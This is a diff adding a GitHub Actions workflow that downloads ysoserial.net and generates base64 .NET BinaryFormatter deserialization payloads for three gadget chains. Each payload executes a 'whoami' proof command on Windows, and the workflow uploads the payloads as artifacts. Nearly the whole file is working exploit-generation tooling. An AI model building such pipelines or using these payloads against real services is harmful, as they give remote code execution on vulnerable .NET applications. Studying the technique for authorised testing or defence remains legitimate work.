@@ -1,0 +1,23 @@
+name: Generate ysoserial payload
+on: [push]
+jobs:
+  generate:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+      - name: Generate TypeConfuseDelegate payload
+        run: |
+          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+          & $exe.FullName -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami > C:\Windows\Temp\pwn.txt' -o base64 | Out-File payload_tcd.b64 -Encoding ascii
+          & $exe.FullName -g WindowsIdentity -f BinaryFormatter -c 'cmd /c whoami > C:\Windows\Temp\pwn.txt' -o base64 | Out-File payload_wid.b64 -Encoding ascii
+          & $exe.FullName -g TextFormattingRunProperties -f BinaryFormatter -c 'cmd /c whoami > C:\Windows\Temp\pwn.txt' -o base64 | Out-File payload_tfrp.b64 -Encoding ascii
+          Get-Content payload_tcd.b64 | Select-Object -First 2
+      - name: Upload payloads
+        uses: actions/upload-artifact@v4
+        with:
+          name: payloads
+          path: "*.b64"
